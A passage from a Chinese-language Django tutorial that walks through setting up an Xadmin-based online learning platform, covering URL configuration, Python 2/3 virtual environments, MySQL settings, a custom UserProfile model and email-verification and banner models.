!= b</code></p><h5 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h5><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/71.png"></p><h3 id="URl的别名设置技巧"><a href="#URl的别名设置技巧" class="headerlink" title="URl的别名设置技巧"></a>URl的别名设置技巧</h3><p>DjangoGetStarted/urls.py：</p><p>为<code>r&#39;^form/$&#39;</code>添加别名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(r&#39;^form&#x2F;$&#39;, getform, name &#x3D; &quot;form_new&quot;)</span><br></pre></td></tr></table></figure><p>前往html中修改action地址为下面所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&#123;% url &quot;form_new&quot; %&#125;&quot; method&#x3D;&quot;post&quot; class&#x3D;&quot;smart-green&quot;&gt;</span><br></pre></td></tr></table></figure><p>这时我们如果改动urls.py中的<code>r&#39;^form/$&#39;</code>不需要再修改前端代码中值。</p><h3 id="url先后顺序问题"><a href="#url先后顺序问题" class="headerlink" title="url先后顺序问题"></a>url先后顺序问题</h3><p><strong>注意</strong>url匹配规则中一定不要忘记<code>/$</code>符号代表以<code>form/</code>结束的才会有效。不会向后继续匹配。比如没有<code>/$</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(r&#39;^form&#39;, getform, name&#x3D;&quot;form_new&quot;)</span><br></pre></td></tr></table></figure><p>这时我们进入浏览器访问时输入<code>http://127.0.0.1:8000/formemmm</code>都可以被响应。</p><p>特别是如果底下还配置有被这个规则包含的条目，会产生被写在更靠前的拦截住得不到正确处理的Bug。</p><blockquote><p>上图我们是想要让formtest响应admin.site.urls。但是会被form提前拦截住。</p></blockquote><p>所以我们一定要注意加上<code>/$</code>符号。</p><h1 id="完成Django的app设计-amp-完成app中的models设计"><a href="#完成Django的app设计-amp-完成app中的models设计" class="headerlink" title="完成Django的app设计 &amp;  完成app中的models设计"></a><center>完成Django的app设计 &amp;  完成app中的models设计</center></h1><p>直接通过Python3.6和django最新版本来开发我们的系统的一些注意事项。</p><p>原版本: Python 2.7 &amp; django 1.9.8<br>现在版本：Python 3.6 &amp; django 1.11</p><p>直接从3.6上手，开始工作，而不用做完2.7再转换。</p><blockquote><p>代码几乎100%兼容2.7 &amp; 3.6</p></blockquote><h3 id="虚拟环境问题"><a href="#虚拟环境问题" class="headerlink" title="虚拟环境问题"></a>虚拟环境问题</h3><blockquote><p>Python2.7 与 Python3.x共存并创建虚拟环境。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkvirtualenv -p C:\...\python.exe mxonline</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="设计model的时候的-unicode-方法"><a href="#设计model的时候的-unicode-方法" class="headerlink" title="设计model的时候的__unicode__方法"></a>设计model的时候的<code>__unicode__</code>方法</h3><p>Python2.7 中:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def __unicode__:</span><br><span class="line">    return self.name</span><br></pre></td></tr></table></figure><p>Python 3.x中:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def __str__(self):</span><br><span class="line">    return self.name</span><br></pre></td></tr></table></figure><blockquote><p>3.x下重载Unicode不会报错，但是会在后台显示有问题。</p></blockquote><h3 id="安装Python的mysql驱动时不能用之前的-MYSQL-python"><a href="#安装Python的mysql驱动时不能用之前的-MYSQL-python" class="headerlink" title="安装Python的mysql驱动时不能用之前的 MYSQL python"></a>安装Python的mysql驱动时不能用之前的 MYSQL python</h3><blockquote><p>这个网址是windows下python包安装的居家必备良品，建议收藏。</p></blockquote><p><a href="https://link.jianshu.com/?t=https://www.lfd.uci.edu/~gohlke/pythonlibs/%23mysql-python">https://www.lfd.uci.edu/~gohlke/pythonlibs/#mysql-python</a></p><p>应该改用<code>Mysqlclient</code>来替换我们的<code>MySQl-python</code></p><blockquote><p>接口是一样的。所以以后建议直接用Mysqlclient，因为它2, 3版本都有。</p></blockquote><h3 id="通过源码方式安装xadmin时。"><a href="#通过源码方式安装xadmin时。" class="headerlink" title="通过源码方式安装xadmin时。"></a>通过源码方式安装xadmin时。</h3><blockquote><p>Github 搜索 mxonline_resources，将里面的Xadmin放进extras_apps中。<br>就不用官方的了。</p></blockquote><blockquote><p>也可以直接使用官方的新版，已经支持了Python3.6</p></blockquote><p>Xadmin安装一定要安装依赖包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">django-crispy-forms~&#x3D;1.6.0</span><br><span class="line">django-import-export&gt;&#x3D;0.5.1</span><br><span class="line">django-reversion~&#x3D;2.0.0</span><br><span class="line">django-formtools</span><br><span class="line">future&#x3D;&#x3D;0.15.2</span><br><span class="line">httplib2&#x3D;&#x3D;0.9.2</span><br><span class="line">six&#x3D;&#x3D;1.10.0</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="使用DjangoUeditor"><a href="#使用DjangoUeditor" class="headerlink" title="使用DjangoUeditor"></a>使用DjangoUeditor</h3><p>官方的不支持Python3, 去mxonline_resource目录下载兼容Python3的版本。<br>放入<code>extras_apps</code></p><h2 id="4-2-django-app-设计"><a href="#4-2-django-app-设计" class="headerlink" title="4-2 django-app 设计"></a>4-2 django-app 设计</h2><blockquote><p>数据库设计</p></blockquote><h3 id="根据app设计-models"><a href="#根据app设计-models" class="headerlink" title="根据app设计 models"></a>根据app设计 models</h3><h3 id="数据表生成与修改"><a href="#数据表生成与修改" class="headerlink" title="数据表生成与修改"></a>数据表生成与修改</h3><p>授课机构提供讲师录制课程，学员完成在线学习。</p><ul><li>全局头部：用户消息 &amp; 个人中心: 没有登录时，就是登录注册</li><li>对于公开课，授课讲师，授课机构进行搜索。</li><li>轮播图，课程，机构，页脚</li><li>公开课：分页公开课，右边热门推荐。</li><li>点进课程：课程详情页。详情: 后台富文本。右边是课程机构的介绍。收藏 或学习</li><li>章节信息 &amp; 课程资源下载 &amp; 评论</li><li>授课讲师: 授课讲师列表页, 讲师排行榜。分页。</li><li>点进讲师: 看到课程。</li><li>授课机构: 类别筛选，机构性质，所在地区 &amp; 排序。用户提交表单，我要学习, 机构排名.</li><li>个人中心: 修改密码, 修改头像, 个人信息, 我的课程, 我的收藏, 我的消息。</li></ul><p>app大致会有<code>用户模块</code>,<code>课程模块</code>,<code>授课教师</code>与<code>授课机构</code>。</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/72.png"></p><p>多一个operation app 是因为数据库的需要。后面会讲。</p><h2 id="4-3-新建项目"><a href="#4-3-新建项目" class="headerlink" title="4-3 新建项目"></a>4-3 新建项目</h2><h3 id="Python2-7-创建虚拟环境。"><a href="#Python2-7-创建虚拟环境。" class="headerlink" title="Python2.7 创建虚拟环境。"></a>Python2.7 创建虚拟环境。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkvirtualenv mxonline2</span><br></pre></td></tr></table></figure><p>安装django</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install django&#x3D;&#x3D;1.9.8 </span><br></pre></td></tr></table></figure><blockquote><p>注意Python2下此处必须用1.9.8</p></blockquote><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/73.png" alt="img"></p><h3 id="Python3-x-创建虚拟环境"><a href="#Python3-x-创建虚拟环境" class="headerlink" title="Python3.x 创建虚拟环境"></a>Python3.x 创建虚拟环境</h3><p>如果你已经通过我的博文《Python开发环境搭建指南(Anaconda2,3共存)》<br>搭建了完美的共存环境使用下面命令创建虚拟环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkvirtualenv -p D:\softEnvDown\Anaconda2\envs\py3\python.exe mxonline3</span><br></pre></td></tr></table></figure><blockquote><p>-p后面路径为自己的Python3的exe文件路径。</p></blockquote><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/74.png" alt="img"></p><blockquote><p>官方说明的最新稳定版为2.0.1(2018-01-08 19:37:06)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">workon mxonline3</span><br><span class="line">pip install django&#x3D;&#x3D;2.0.1</span><br></pre></td></tr></table></figure><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/75.png" alt="img"></p><p>至此我们的两个虚拟环境都已经准备好了。</p><h3 id="新建Python2-下Project"><a href="#新建Python2-下Project" class="headerlink" title="新建Python2 下Project"></a>新建Python2 下Project</h3><p>为Mxonline2 配置环境 <code>mxonline2</code></p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/76.png" alt="img"></p><p>注意一直定位到Python.exe。</p><h4 id="安装mysql驱动。"><a href="#安装mysql驱动。" class="headerlink" title="安装mysql驱动。"></a>安装mysql驱动。</h4><p>下载<a href="https://link.jianshu.com/?t=https://www.lfd.uci.edu/~gohlke/pythonlibs/%23mysql-python">https://www.lfd.uci.edu/~gohlke/pythonlibs/#mysql-python</a>中<br>mysqlclient‑1.3.12‑cp34‑cp34m‑win_amd64.whl进行本地安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">workon mxonline2</span><br><span class="line">pip install mysqlclient-1.3.12-cp27-cp27m-win_amd64.whl</span><br></pre></td></tr></table></figure><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/77.png" alt="img"></p><h3 id="新建Python3-下Project"><a href="#新建Python3-下Project" class="headerlink" title="新建Python3 下Project"></a>新建Python3 下Project</h3><p>为Mxonline3 配置环境 <code>mxonline3</code></p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/78.png" alt="img"></p><blockquote><p>注意一直定位到Python.exe。</p></blockquote><h4 id="安装mysql驱动。-1"><a href="#安装mysql驱动。-1" class="headerlink" title="安装mysql驱动。"></a>安装mysql驱动。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">workon mxonline3</span><br><span class="line">pip install mysqlclient</span><br></pre></td></tr></table></figure><h3 id="setting中配置"><a href="#setting中配置" class="headerlink" title="setting中配置"></a>setting中配置</h3><p>Mxonline2/settings.py:<br>Mxonline3/settings.py:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DATABASES &#x3D; &#123;</span><br><span class="line">    &#39;default&#39;: &#123;</span><br><span class="line">        &#39;ENGINE&#39;: &#39;django.db.backends.mysql&#39;,</span><br><span class="line">        &#39;NAME&#39;: &#39;mxonline2&#39;,</span><br><span class="line">        &#39;USER&#39;: &#39;root&#39;,</span><br><span class="line">        &#39;PASSWORD&#39;: &#39;你的密码&#39;,</span><br><span class="line">        &#39;HOST&#39;:&#39;127.0.0.1&#39;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DATABASES &#x3D; &#123;</span><br><span class="line">    &#39;default&#39;: &#123;</span><br><span class="line">        &#39;ENGINE&#39;: &#39;django.db.backends.mysql&#39;,</span><br><span class="line">        &#39;NAME&#39;: &#39;mxonline3&#39;,</span><br><span class="line">        &#39;USER&#39;: &#39;root&#39;,</span><br><span class="line">        &#39;PASSWORD&#39;: &#39;你的密码&#39;,</span><br><span class="line">        &#39;HOST&#39;:&#39;127.0.0.1&#39;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="前往Navicat新建数据库"><a href="#前往Navicat新建数据库" class="headerlink" title="前往Navicat新建数据库"></a>前往Navicat新建数据库</h3><p>mxonline2 &amp; mxonline3</p><h4 id="进行数据库初始化makemigrations"><a href="#进行数据库初始化makemigrations" class="headerlink" title="进行数据库初始化makemigrations"></a>进行数据库初始化makemigrations</h4><p>点击<code>Tools 菜单下 Run manage.py Task</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">makemigrations</span><br><span class="line">migrate</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>2,3操作一致</p></blockquote><p>点击 RUn edit</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/79.png" alt="img"></p><p>可以为2,3配置不同的port。比如2: 8002 &amp; 3: 8003</p><p>2: 点击run运行: django1.9.8成功画面如下。</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/80.png" alt="img"></p><p>3: 点击run运行: django2.0.1成功画面如下。</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/81.png" alt="img"></p><p>这时我们的项目就新建成功。</p><p>此处对应commit:</p><blockquote><p>项目初始化成功: 完成数据库Migration初始化。 对应4-3</p></blockquote><h2 id="4-4-自定义userprofile"><a href="#4-4-自定义userprofile" class="headerlink" title="4-4 自定义userprofile"></a>4-4 自定义userprofile</h2><p>点击<code>Tools 菜单下 Run manage.py Task</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">startapp users</span><br></pre></td></tr></table></figure><h3 id="编写我们的model设计user表。"><a href="#编写我们的model设计user表。" class="headerlink" title="编写我们的model设计user表。"></a>编写我们的model设计user表。</h3><p>系统自动生成的user表如下:</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/86.png" alt="img"></p><p>mark</p><ul><li>id: 主键, password 密码, last_login Django自动记录用户最后登录时间,。</li><li>is_superuser 表明用户是否是超级用户(后台管理会用到)。</li><li>username 用户名字段不要随便改动, email 邮箱,</li><li>is_staff 表示是否是员工(后台管理会用到)。</li><li>is_active 用户是否是激活状态, date_joined 注册时间。</li></ul><blockquote><p>我们需要扩展我们自己的需求字段。</p></blockquote><p>个人中心页面中:</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/87.png"></p><p>可以看到我们还需要的有：</p><ul><li>昵称: nickname</li><li>生日: birthday</li><li>性别: gender</li></ul><p>User表的自定义方法可以查看django官方文档。<br>我们既想保留原有字段，又想有新字段。</p><p>users/models.py添加代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from django.contrib.auth.models import AbstractUser</span><br><span class="line"></span><br><span class="line">class UserProfile(AbstractUser):</span><br><span class="line">    # 自定义的性别选择规则</span><br><span class="line">    GENDER_CHOICES &#x3D; (</span><br><span class="line">        (&quot;male&quot;, u&quot;男&quot;),</span><br><span class="line">        (&quot;female&quot;, u&quot;女&quot;)</span><br><span class="line">    )</span><br><span class="line">    # 昵称</span><br><span class="line">    nick_name &#x3D; models.CharField(max_length&#x3D;50, verbose_name&#x3D;u&quot;昵称&quot;, default&#x3D;&quot;&quot;)</span><br><span class="line">    # 生日，可以为空</span><br><span class="line">    birthday &#x3D; models.DateField(verbose_name&#x3D;u&quot;生日&quot;, null&#x3D;True, blank&#x3D;True)</span><br><span class="line">    # 性别 只能男或女，默认女</span><br><span class="line">    gender &#x3D; models.CharField(</span><br><span class="line">        max_length&#x3D;5,</span><br><span class="line">        verbose_name&#x3D;u&quot;性别&quot;,</span><br><span class="line">        choices&#x3D;GENDER_CHOICES,</span><br><span class="line">        default&#x3D;&quot;female&quot;)</span><br><span class="line">    # 地址</span><br><span class="line">    address &#x3D; models.CharField(max_length&#x3D;100, verbose_name&#x3D;&quot;地址&quot;, default&#x3D;&quot;&quot;)</span><br><span class="line">    # 电话</span><br><span class="line">    mobile &#x3D; models.CharField(max_length&#x3D;11, null&#x3D;True, blank&#x3D;True)</span><br><span class="line">    # 头像 默认使用default.png</span><br><span class="line">    image &#x3D; models.ImageField(</span><br><span class="line">        upload_to&#x3D;&quot;image&#x2F;%Y&#x2F;%m&quot;,</span><br><span class="line">        default&#x3D;u&quot;image&#x2F;default.png&quot;,</span><br><span class="line">        max_length&#x3D;100</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    # meta信息，即后台栏目名</span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name &#x3D; &quot;用户信息&quot;</span><br><span class="line">        verbose_name_plural &#x3D; verbose_name</span><br><span class="line"></span><br><span class="line">    # 重载Unicode方法，打印实例会打印username，username为继承自abstractuser</span><br><span class="line">    def __unicode__(self):</span><br><span class="line">        return self.username</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>点进<code>AbstractUser</code>可以看到这个models里面就有我们默认表的那些字段。</p><p>因为Image字段需要用到<code>pillow</code>所以需要安装该库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pillow</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>注意：CharField必须有max_length, Imagefield实际也是charfield所以也要有max_length</strong></p><h4 id="setting设置INSTALLED-APPS-amp-AUTH-USER-MODEL。"><a href="#setting设置INSTALLED-APPS-amp-AUTH-USER-MODEL。" class="headerlink" title="setting设置INSTALLED_APPS &amp; AUTH_USER_MODEL。"></a>setting设置INSTALLED_APPS &amp; AUTH_USER_MODEL。</h4><ul><li>INSTALLED_APPS注册app</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;users&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>重载AUTH_USER_MODEL</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 此处重载是为了使我们的UserProfile生效</span><br><span class="line">AUTH_USER_MODEL &#x3D; &quot;users.UserProfile&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/88.png"></p><p>点击<code>Tools 菜单下 Run manage.py Task</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">makemigrations users</span><br><span class="line">migrate users</span><br></pre></td></tr></table></figure><blockquote><p>上图中可以看到数据库做出的改动。输入: yes</p></blockquote><h3 id="进入Navicat进行验证"><a href="#进入Navicat进行验证" class="headerlink" title="进入Navicat进行验证"></a>进入Navicat进行验证</h3><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/84.png" alt="img"></p><p>如上图可以看到我们的表已经生成成功。</p><h3 id="附加Python3下不同与报错："><a href="#附加Python3下不同与报错：" class="headerlink" title="附加Python3下不同与报错："></a>附加Python3下不同与报错：</h3><p>将Unicode方法改为str方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 重载__str__方法，打印实例会打印username，username为继承自AbstractUser</span><br><span class="line">def __str__(self):</span><br><span class="line">    return self.username</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">django.db.migrations.exceptions.InconsistentMigrationHistory: Migration</span><br><span class="line">admin.0001_initial is applied before its dependency users.0001_initial on</span><br><span class="line">database &#39;default&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解决方案:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">删除数据库中 除了auth_user的其他表</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后执行命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">makemigrations</span><br><span class="line">migrate</span><br><span class="line">makemigrations users</span><br><span class="line">migrate users</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/85.png" alt="img"></p><blockquote><p>共11张表，同期django1.9.8会产生13张表</p></blockquote><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/86.png%5D" alt="img"></p><blockquote><p>我推测是因为在django2.0版本中。我们如果自定义了userProfile并且在setting中进行了设置。那么auth_user将不再拥有多的表。</p></blockquote><p>下次不要再初始化时执行makemigrations &amp; migrate。当我们设计userProfile完成之后再执行。</p><p>本小节完成对应commit:</p><blockquote><p>完成USerProfile models书写。makemigrations &amp; migrate 建表成功。对应4-4</p></blockquote><h2 id="4-5-user-modesl-py设计"><a href="#4-5-user-modesl-py设计" class="headerlink" title="4-5 user modesl.py设计"></a>4-5 user modesl.py设计</h2><p>循环引用:</p><blockquote><p>设计app时每个app都有model</p></blockquote><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/89.png" alt="img"></p><p>如图：我们在user中定义usercourse记录用户学习的课程。会有两个外键：user和course。<br>我们就会<code>import Courses.models</code></p><p>如果用户对课程的评论：会放在 <code>Courses.models</code>当中。评论我们需要保存相应的用户。<br>我们就会<code>import User.models</code></p><p>循环import会出错。a与b相互调用，造成等待。</p><h3 id="解决循环引用-分层设计"><a href="#解决循环引用-分层设计" class="headerlink" title="解决循环引用: 分层设计"></a>解决循环引用: 分层设计</h3><p>目前已有app：users courses organization</p><p>另外一个app高于这些app的层级。<code>operation</code>.上一层app可以import下层的app。</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/90.png" alt="img"></p><p>上节中: 自定义<code>userprofile</code> 覆盖默认<code>user</code>表</p><p>user中还需要添加的(前提是这些功能比较独立):</p><ul><li>EmailVerifyRecord - 邮箱验证码</li><li>PageBanner - 轮播图</li></ul><p>观察轮播图:</p><blockquote><ol><li>图片 2. 点击图片地址 3. 轮播图序号(控制前后)</li></ol></blockquote><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/91.png" alt="img"></p><p>users/models.py中添加代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line"># 邮箱验证码model</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class EmailVerifyRecord(models.Model):</span><br><span class="line">    SEND_CHOICES &#x3D; (</span><br><span class="line">        (&quot;register&quot;, u&quot;注册&quot;),</span><br><span class="line">        (&quot;forget&quot;, u&quot;找回密码&quot;)</span><br><span class="line">    )</span><br><span class="line">    code &#x3D; models.CharField(max_length&#x3D;20, verbose_name&#x3D;u&quot;验证码&quot;)</span><br><span class="line">    # 未设置null &#x3D; true blank &#x3D; true 默认不可为空</span><br><span class="line">    email &#x3D; models.EmailField(max_length&#x3D;50, verbose_name&#x3D;u&quot;邮箱&quot;)</span><br><span class="line">    send_type &#x3D; models.CharField(choices&#x3D;SEND_CHOICES, max_length&#x3D;10)</span><br><span class="line">    # 这里的now得去掉(),不去掉会根据编译时间。而不是根据实例化时间。</span><br><span class="line">    send_time &#x3D; models.DateTimeField(default&#x3D;datetime.now)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name &#x3D; &quot;邮箱验证码&quot;</span><br><span class="line">        verbose_name_plural &#x3D; verbose_name</span><br><span class="line"></span><br><span class="line"># 轮播图model</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Banner(models.Model):</span><br><span class="line">    title &#x3D; models.CharField(max_length&#x3D;100, verbose_name&#x3D;u&quot;标题&quot;)</span><br><span class="line">    image &#x3D; models.ImageField(</span><br><span class="line">        upload_to&#x3D;&quot;banner&#x2F;%Y&#x2F;%m&quot;,</span><br><span class="line">        verbose_name&#x3D;u&quot;轮播图&quot;,</span><br><span class="line">        max_length&#x3D;100)</span><br><span class="line">    url &#x3D; models.URLField(max_length&#x3D;200, verbose_name&#x3D;u&quot;访问地址&quot;)</span><br><span class="line">    # 默认index很大靠后。想要靠前修改index值。</span><br><span class="line">    index &#x3D; models.IntegerField(default&#x3D;100, verbose_name&#x3D;u&quot;顺序&quot;)</span><br><span class="line">    add_time &#x3D; models.DateTimeField(default&#x3D;datetime.now, verbose_name&#x3D;u&quot;添加时间&quot;)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name &#x3D; u&quot;轮播图&quot;</span><br><span class="line">        verbose_name_plural &#x3D; verbose_name</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从上往下: 第一块区域import官方包，第二块import第三方。(PEP8)</p><p><img 